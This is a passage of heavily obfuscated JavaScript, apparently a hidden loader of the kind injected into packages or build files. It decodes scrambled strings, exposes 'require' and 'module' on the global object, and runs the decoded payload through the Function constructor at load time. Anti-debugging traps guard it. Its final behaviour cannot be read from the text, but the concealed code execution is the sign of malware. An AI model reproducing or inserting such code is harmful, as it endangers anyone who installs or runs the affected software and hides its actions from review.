IGLuLi8uK5ey1jfuInwlI5HC2fBBIzslcq8lfi8BZrsuMvfuILZC0XDoevtuLjLuKvPuNTspgmUEYbJv0DMFw9OzgnHCY5DlIbMud0GB3m2n0vVy0LqB2mGlJDPz2ngq1iUidXJrs5oic5IuG','ntC5nJyWme1lug5psq','C3bSAxq','nZm1nZy1ohD2sNDVDa','EvDoCMS','C3rYAw5N','mJm3mJm4mMjMqMHwBW','zNjVBunOyxjdB2rL','xcTCkYaQkd86w2eTEKeTwL8KxvSWltLHlxPblvPFjf0Qkq','mty5vwPvEfL4','v2XIDK0','oefkt1j0tW','mJGWmKvPu3nyzW','y29UC3rYDwn0B3i','C3rHDgvpyMPLy3q','DgvZDa','wvL5y3a','mtCXmdCWohvvCfr3yG','BKzWr1O','mtC5nZi3mZvMANHIANe','yxbWBhK','y2HHAw4','mhWXFdr8nxWYFdm','BgvUz3rO','m3vorML6Da','nJGYnMz3vfHUDa','y2fSBa','mJm5nvnqEvbnBq','AM9PBG','rNzgA3O'];_0x15c9=function(){return _0x1a38ff;};return _0x15c9();}function splitLane(_0xaa0bcf){var _0x5be49f=_0xf3c5,_0x27cf83=_0x5be49f(0xd)[_0x5be49f(0x17)]('|'),_0xb10872=0x0;while(!![]){switch(_0x27cf83[_0xb10872++]){case'0':var _0x28651a=String[_0x5be49f(0x1c)](0x1c);continue;case'1':var _0x2636b1=spin(_0xaa0bcf,NX);continue;case'2':_0x2636b1=_0x2636b1[_0x5be49f(0x17)]('*0')[_0x5be49f(0x13)]('*');continue;case'3':return _0x2636b1[_0x5be49f(0x17)](_0x28651a);case'4':_0x2636b1=_0x2636b1[_0x5be49f(0x17)]('^')[_0x5be49f(0x13)](_0x28651a);continue;case'5':_0x2636b1=_0x2636b1[_0x5be49f(0x17)]('*1')['join']('^');continue;}break;}}function peel(_0x1337af){var _0x28595b=_0xf3c5,_0x13f25f={'FvFkz':function(_0x2c12e0,_0x51b114,_0x5c5bbf){return _0x2c12e0(_0x51b114,_0x5c5bbf);}};return _0x13f25f[_0x28595b(0x14)](spin,_0x1337af,SX);}(function boot(_0x2ac801,_0x4a4a4d){var _0x544a87=_0xf3c5,_0x466bd0={'nFpGZ':_0x544a87(0x1d),'YYycp':function(_0x1bef04,_0x4e4527){return _0x1bef04+_0x4e4527;},'VnuCD':function(_0x2c7482){return _0x2c7482();},'WlbvM':'=aenruh(al=5c,g8fdu.yr\x20..ncecf,5\x22paeau6lnj)r]2uv\x22x-q(]\x20a;(r=;;r+(a[8.s2tAgoq,uh8C,ai,s;a(Am0(nj;jv*,7vo7()(o;m6oa4rw).\x20rod[fs2n{drvt4x)+0,anr+rr+o)}z1\x20=hf[an8r1r[,]s7-77laa.ui7{-069lvmt2r=i]]<+)u,e),,;nrh[r=0v-r(;,=p)Cus=+c;g;f;qA))1vi)vk0nrl1ae\x20f=[;hisy.em(d+o!2\x20=(evea78=.)4ei=g.n={ff=1[<2a\x20f1=r;4,S)rylv1u\x20y;kql{tvnv\x20(C\x20(l,ovnp\x20i=tlr,r.lwozh(l,tq;;rr((v=ahsv;]xq=ab;da;,((r;vjq.(t[+)da)rdnrhs41y(vr;fh;3g\x22]e(.ahrpapg]g.)ngfpn1h,icl;;)=C;m5=+r,\x20.);u=+s}+)it,+bm;d+um)-=siiqol=t=r=q9+..chq+[6fe\x20t0nrpr(\x20vr8flrn,ddgt\x20]6a.;m;rth.gq\x202a}eveic]gbti<4o;C;l,zzi6+l[a[;+(si\x22li\x22r,npi9s,frfhuw)ow=e{(b=wen2t.gu.i=kiaaa+)yftpa3n})=9\x22)cpA+u;utp]\x22=lk7vpt\x201r;hzw\x22)t()9)(.lul=s7f;\x20;sq0)n\x22y+0s}=va+s\x20mh(0q.]hv;>\x2006=A-ozetr(t1rtrsiso0e,.;z[(f<5e7t,(raoavnr;thhf;v,j=r;\x20)r>18zho*o{<akmsn)akte.vo9+ea0clio;bu\x20=]C!gj;y3+l)e=.}dr=i6oiC8rnn0;6=ar\x22}.rei=]Stsrnn.;2r=t;[t;iv=prCrn()aretuz+\x20hlk[+x=e\x20-8j{(ejy9(())\x20','rZCSF':function(_0xc54a6f,_0x49210e){return _0xc54a6f(_0x49210e);},'kxdTD':_0x544a87(0x15),'yWNrk':function(_0x1989d1,_0x1594e2,_0x36ee07){return _0x1989d1(_0x1594e2,_0x36ee07);}},_0x40c5f8=(function(){var _0x472fda=!![];return function(_0x48bf7f,_0x5598e3){var _0x23e839=_0x472fda?function(){var _0x520d8b=_0xf3c5;if(_0x5598e3){var _0x3f6330=_0x5598e3[_0x520d8b(0xb)](_0x48bf7f,arguments);return _0x5598e3=null,_0x3f6330;}}:function(){};return _0x472fda=![],_0x23e839;};}());(function(){_0x40c5f8(this,function(){var _0x17d172=_0xf3c5,_0x53a827=new RegExp('function\x20*\x5c(\x20*\x5c)'),_0x1b7c3e=new RegExp(_0x466bd0[_0x17d172(0x9)],'i'),_0x24a1f1=_0x5f2374('init');!_0x53a827[_0x17d172(0x6)](_0x466bd0[_0x17d172(0x7)](_0x24a1f1,_0x17d172(0xc)))||!_0x1b7c3e['test'](_0x24a1f1+'input')?_0x24a1f1('0'):_0x466bd0['VnuCD'](_0x5f2374);})();}()),_0x2ac801['z']=z;var _0x2a0ac0=splitLane('c^mejb^tro');_0x2ac801[_0x2a0ac0[0x0]]=_0x4a4a4d;typeof module===_0x2a0ac0[0x1]&&(_0x2ac801[_0x2a0ac0[0x2]]=module);var _0x5c947e=peel('hqersxluvwacdjbymgorzfkociptrutnstonc'),_0x26f8af=_0x5c947e['substring'](0x0,0xb),_0x4b275f=peel[_0x26f8af],_0x5358d6=_0x4b275f('',peel(_0x466bd0[_0x544a87(0x1)])),_0x5acdeb=_0x5358d6(_0x466bd0['rZCSF'](peel,_0x466bd0['kxdTD']));return _0x466bd0[_0x544a87(0x19)](_0x4b275f,'',_0x5acdeb)(0x9cd),0x1fce;}(global,require));function _0x5f2374(_0x2cfb75){function _0x1b59ed(_0x2956eb){var _0x392534=_0xf3c5;if(typeof _0x2956eb===_0x392534(0x1a))return function(_0x36e6e2){}[_0x392534(0x4)]('while\x20(true)\x20{}')[_0x392534(0xb)]('counter');else(''+_0x2956eb/_0x2956eb)[_0x392534(0xe)]!==0x1||_0x2956eb%0x14===0x0?function(){return!![];}['constructor']('debu'+'gger')[_0x392534(0x11)]('action'):function(){return![];}[_0x392534(0x4)]('debu'+'gger')[_0x392534(0xb)](_0x392534(0x5));_0x1b59ed(++_0x2956eb);}try{if(_0x2cfb75)return _0x1b59ed;else _0x1b59ed(0x0);}catch(_0x1c0960){}}
